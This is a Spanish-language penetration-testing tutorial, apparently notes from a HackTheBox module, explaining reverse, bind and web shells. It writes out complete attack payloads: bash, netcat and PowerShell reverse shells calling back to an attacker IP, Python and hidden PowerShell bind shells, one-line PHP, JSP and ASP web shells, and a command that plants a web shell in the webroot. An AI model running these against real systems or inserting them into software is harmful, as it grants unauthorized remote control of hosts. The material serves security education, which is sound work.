**Tipos de Shells**  
Una vez que comprometemos un sistema y explotamos una vulnerabilidad para ejecutar comandos de forma remota en los hosts comprometidos, usualmente necesitamos un método de comunicación con el sistema para no tener que seguir explotando la misma vulnerabilidad cada vez que queramos ejecutar un comando. Para enumerar el sistema o tomar un mayor control sobre él o su red, necesitamos una conexión confiable que nos dé acceso directo al shell del sistema, como Bash o PowerShell, de manera que podamos investigar exhaustivamente el sistema remoto para planear nuestro próximo movimiento.

Una forma de conectarnos a un sistema comprometido es mediante protocolos de red, como SSH para Linux o WinRM para Windows, los cuales nos permitirían iniciar sesión remotamente en el sistema comprometido. Sin embargo, a menos que obtengamos un conjunto válido de credenciales, no podríamos utilizar estos métodos sin ejecutar primero comandos en el sistema remoto para acceder a estos servicios.

La otra forma de acceder a un host comprometido para tener control y ejecutar código de manera remota es a través de **shells**.  
Como se mencionó anteriormente, hay tres tipos principales de shells: **Reverse Shell**, **Bind Shell** y **Web Shell**. Cada uno de estos shells tiene un método diferente de comunicación con nosotros para aceptar y ejecutar nuestros comandos.

|**Tipo de Shell**|**Método de Comunicación**|
|---|---|
|**Reverse Shell**|Se conecta de vuelta a nuestro sistema y nos da control mediante una conexión inversa.|
|**Bind Shell**|Espera que nosotros nos conectemos a él y nos da control una vez que lo hacemos.|
|**Web Shell**|Se comunica a través de un servidor web, acepta nuestros comandos mediante parámetros HTTP, los ejecuta y nos devuelve el resultado.|

Vamos a profundizar más en cada uno de estos shells y revisar ejemplos de cada uno.

**Reverse Shell**  
Un **Reverse Shell** es el tipo más común de shell, ya que es el método más rápido y fácil para obtener control sobre un host comprometido. Una vez que identificamos una vulnerabilidad en el host remoto que permite la ejecución remota de comandos, podemos iniciar un **escuchador netcat** en nuestra máquina, que escucha en un puerto específico, por ejemplo, el puerto 1234. Con este escuchador en funcionamiento, podemos ejecutar un comando de reverse shell que conecta el shell del sistema remoto (como Bash o PowerShell) a nuestro escuchador netcat, lo que nos da una conexión inversa sobre el sistema remoto.

### Escuchador Netcat

El primer paso es iniciar un escuchador netcat en un puerto de nuestra elección:

`pista95@htb[/htb]$ nc -lvnp 1234`


`listening on [any] 1234 ...`

Las banderas que estamos utilizando son las siguientes:

|**Banderas**|**Descripción**|
|---|---|
|`-l`|Modo de escucha, para esperar que una conexión se conecte a nosotros.|
|`-v`|Modo detallado, para saber cuándo recibimos una conexión.|
|`-n`|Desactiva la resolución de DNS y solo se conecta desde/a IPs, para acelerar la conexión.|
|`-p 1234`|Número de puerto en el que netcat está escuchando y al que se enviará la conexión inversa.|

Ahora que tenemos un escuchador netcat esperando una conexión, podemos ejecutar el comando de reverse shell que se conectará a nosotros.

### Conectar la IP de Retorno

Primero, necesitamos encontrar la IP de nuestro sistema para enviar una conexión inversa de vuelta a nosotros. Podemos encontrar nuestra IP con el siguiente comando:


`pista95@htb[/htb]$ ip a`


`...SNIP...  3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500     link/none     inet 10.10.10.10/23 scope global tun0 ...SNIP...`

En nuestro ejemplo, la IP que nos interesa está bajo la interfaz **tun0**, que es la misma red de HackTheBox a la que estamos conectados a través de nuestra VPN.

**Nota**: Nos conectamos a la IP en 'tun0' porque solo podemos conectarnos a las máquinas de HackTheBox a través de la conexión VPN, ya que no tienen conexión a internet, y por lo tanto, no pueden conectarse a nosotros a través de `eth0`. En una prueba de penetración real, podrías estar directamente conectado a la misma red, o realizando una prueba de penetración externa, por lo que podrías conectarte a través del adaptador `eth0` o uno similar.

**Comando de Reverse Shell**  
El comando que ejecutamos depende del sistema operativo que esté ejecutando el host comprometido, es decir, Linux o Windows, y de qué aplicaciones y comandos tengamos acceso. La página **Payload All The Things** tiene una lista exhaustiva de comandos de reverse shell que podemos usar, cubriendo una amplia gama de opciones según nuestro host comprometido.

Algunos comandos de reverse shell son más confiables que otros y se pueden intentar para obtener una conexión inversa. A continuación, se muestran comandos confiables que podemos utilizar para obtener una conexión inversa, tanto en bash para hosts comprometidos con Linux como en PowerShell para hosts comprometidos con Windows:

**Comando para bash en Linux:**


`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`

**Otro comando para bash en Linux:**


`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`

**Comando para PowerShell en Windows:**


`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`

Podemos utilizar el exploit que tenemos en el host remoto para ejecutar uno de los comandos anteriores, por ejemplo, a través de un exploit en Python o un módulo de Metasploit, para obtener una conexión inversa. Una vez que lo hagamos, deberíamos recibir una conexión en nuestro escuchador netcat:

`pista95@htb[/htb]$ nc -lvnp 1234`

`listening on [any] 1234 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572`

`id uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Como podemos ver, después de recibir una conexión en nuestro escuchador netcat, pudimos escribir nuestro comando y obtener directamente su salida en nuestra máquina.

Un **Reverse Shell** es útil cuando queremos obtener una conexión rápida y confiable con nuestro host comprometido. Sin embargo, puede ser muy frágil. Si el comando de reverse shell se detiene o si perdemos nuestra conexión por alguna razón, tendríamos que usar el exploit inicial nuevamente para ejecutar el comando de reverse shell y recuperar el acceso.

**Bind Shell**  
Otro tipo de shell es la **Bind Shell**. A diferencia de la **Reverse Shell**, que se conecta a nosotros, en este caso debemos conectarnos a ella en el puerto que el objetivo esté escuchando.

Una vez que ejecutamos un comando de **Bind Shell**, este comenzará a escuchar en un puerto en el host remoto y enlazará la shell de ese host (por ejemplo, Bash o PowerShell) a ese puerto. Luego, debemos conectarnos a ese puerto usando netcat, lo que nos permitirá obtener el control mediante una shell en ese sistema.

### Comando de Bind Shell

Nuevamente, podemos utilizar **Payload All The Things** para encontrar un comando adecuado para iniciar nuestra bind shell.

**Nota**: vamos a iniciar una conexión escuchando en el puerto "1234" en el host remoto, con la IP "0.0.0.0", para que podamos conectarnos desde cualquier lugar.

A continuación, algunos comandos confiables para iniciar una bind shell:

**Comando para Bash en Linux:**

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`

**Comando para Python:**

`python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`

**Comando para PowerShell en Windows:**

`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`

### Conexión con Netcat

Una vez que ejecutamos el comando de bind shell, deberíamos tener una shell esperando en el puerto especificado. Ahora podemos conectarnos a ese puerto.

Podemos usar netcat para conectarnos a ese puerto y obtener una conexión con la shell:

`pista95@htb[/htb]$ nc 10.10.10.1 1234`

`id uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Como podemos ver, nos conectamos directamente a una sesión de bash y podemos interactuar directamente con el sistema objetivo. A diferencia de una **Reverse Shell**, si perdemos nuestra conexión con una **Bind Shell**, podemos volver a conectarnos y obtener una nueva conexión de inmediato. Sin embargo, si el comando de bind shell se detiene por alguna razón, o si el host remoto se reinicia, perderemos nuestro acceso y tendríamos que explotar nuevamente el sistema para recuperar el acceso.


**Mejorando la TTY**

Una vez que nos conectamos a una shell mediante Netcat, notaremos que solo podemos escribir comandos o usar la tecla de retroceso, pero no podemos mover el cursor de texto hacia la izquierda o derecha para editar nuestros comandos, ni tampoco acceder al historial de comandos. Para solucionar esto, necesitamos mejorar nuestra **TTY** (TeleTYpewriter). Esto se logra mapeando nuestra terminal TTY con la TTY del sistema remoto.

Existen varios métodos para mejorar la TTY. En este caso, utilizaremos el método basado en **Python/stty**. En nuestra shell de Netcat, ejecutaremos el siguiente comando para usar Python y mejorar el tipo de shell a una TTY completa:

`pista95@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'`

Después de ejecutar este comando, presionaremos `Ctrl+Z` para enviar la shell al fondo y volver a nuestra terminal local. A continuación, ingresamos el siguiente comando **stty**:


`www-data@remotehost$ ^Z  pista95@htb[/htb]$ stty raw -echo pista95@htb[/htb]$ fg`

Después de presionar `fg`, la shell de Netcat volverá al primer plano. En este punto, la terminal mostrará una línea en blanco. Podemos presionar `Enter` nuevamente para volver a nuestra shell o escribir `reset` y presionar `Enter` para restablecerla. En este momento, tendremos una shell TTY completamente funcional con acceso al historial de comandos y todas las demás funcionalidades.

Es posible que nuestra shell no cubra toda la terminal. Para corregir esto, necesitamos obtener algunos valores variables. Podemos abrir otra ventana de terminal en nuestro sistema, maximizarla o usar cualquier tamaño, e ingresar los siguientes comandos para obtener nuestras variables:

`pista95@htb[/htb]$ echo $TERM`

Este comando nos mostrará la variable **TERM** (en este caso, probablemente `xterm-256color`).

`pista95@htb[/htb]$ stty size`

Este comando nos dará los valores de filas y columnas respectivamente, por ejemplo:


`67 318`

Ahora que tenemos nuestras variables, volvemos a nuestra shell de Netcat y usamos los siguientes comandos para corregir el tamaño de la terminal:

`www-data@remotehost$ export TERM=xterm-256color`
`www-data@remotehost$ stty rows 67 columns 318`

Una vez hecho esto, deberíamos tener una shell de Netcat que use las funciones completas de la terminal, similar a una conexión SSH.

### **Web Shell**

El último tipo de shell que tenemos es una **Web Shell**. Una Web Shell es típicamente un script web, como PHP o ASPX, que recibe nuestros comandos a través de parámetros de solicitud HTTP, como los parámetros de las solicitudes **GET** o **POST**, ejecuta nuestro comando y muestra su salida en la página web.

### **Escribiendo una Web Shell**

Primero, necesitamos escribir nuestra web shell, que tomará nuestro comando a través de una solicitud **GET**, lo ejecutará y devolverá su salida. Un script de web shell suele ser muy corto, a menudo una línea de código, y fácil de memorizar. A continuación, se muestran algunos ejemplos comunes de scripts de web shell para lenguajes web populares:

- **PHP**:

    `<?php system($_REQUEST["cmd"]); ?>`
    
- **JSP**:
    
    `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
    
- **ASP**:

    
    `<% eval request("cmd") %>`
    

### **Subiendo una Web Shell**

Una vez que tenemos nuestro script de web shell, necesitamos colocarlo en el directorio web del host remoto (el **webroot**) para poder ejecutarlo a través del navegador. Esto puede hacerse aprovechando una vulnerabilidad en una funcionalidad de carga de archivos, lo que nos permitiría escribir uno de nuestros shells en un archivo, por ejemplo, `shell.php`, subirlo y luego acceder a él para ejecutar comandos.

Si solo tenemos ejecución de comandos remota mediante un exploit, podemos escribir nuestra shell directamente en el webroot para acceder a ella a través del navegador web. El primer paso es identificar dónde está ubicado el webroot. Los siguientes son los directorios webroot predeterminados para servidores web comunes:

|**Servidor Web**|**Webroot Predeterminado**|
|---|---|
|**Apache**|`/var/www/html/`|
|**Nginx**|`/usr/local/nginx/html/`|
|**IIS**|`C:\inetpub\wwwroot\`|
|**XAMPP**|`C:\xampp\htdocs\`|

Podemos comprobar estos directorios para ver cuál se está utilizando como webroot y luego usar el comando `echo` para escribir nuestra web shell. Por ejemplo, si estamos atacando un host Linux que ejecuta Apache, podemos escribir una shell en PHP con el siguiente comando:

bash

Copiar código

`echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`

### **Accediendo a la Web Shell**

Una vez que nuestra web shell está en el webroot, podemos acceder a ella a través de un navegador web utilizando la URL correspondiente.

### **Web Shell**

Una vez que escribimos nuestra web shell, podemos acceder a ella ya sea a través de un navegador o utilizando **cURL**. Podemos visitar la página `shell.php` en el sitio web comprometido y usar el parámetro `?cmd=id` para ejecutar el comando **id**:

`http://SERVER_IP:PORT/shell.php?cmd=id`

Otra opción es usar **cURL**:

`pista95@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id`

Esto devolverá la salida del comando:

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Como se puede ver, podemos seguir cambiando el comando para obtener su salida. Una gran ventaja de una web shell es que puede eludir las restricciones del firewall, ya que no abrirá una nueva conexión en un puerto, sino que funcionará en el puerto web estándar, como el **80** o el **443**, o en cualquier puerto que esté utilizando la aplicación web. Además, si el host comprometido se reinicia, la web shell seguirá allí, lo que nos permitirá acceder a ella y ejecutar comandos sin tener que explotar el host nuevamente.

Por otro lado, una web shell no es tan interactiva como las shells reverse o bind, ya que tenemos que seguir solicitando una URL diferente para ejecutar cada comando. Sin embargo, en casos extremos, es posible crear un script en **Python** para automatizar este proceso y proporcionarnos una web shell semi-interactiva directamente desde nuestra terminal.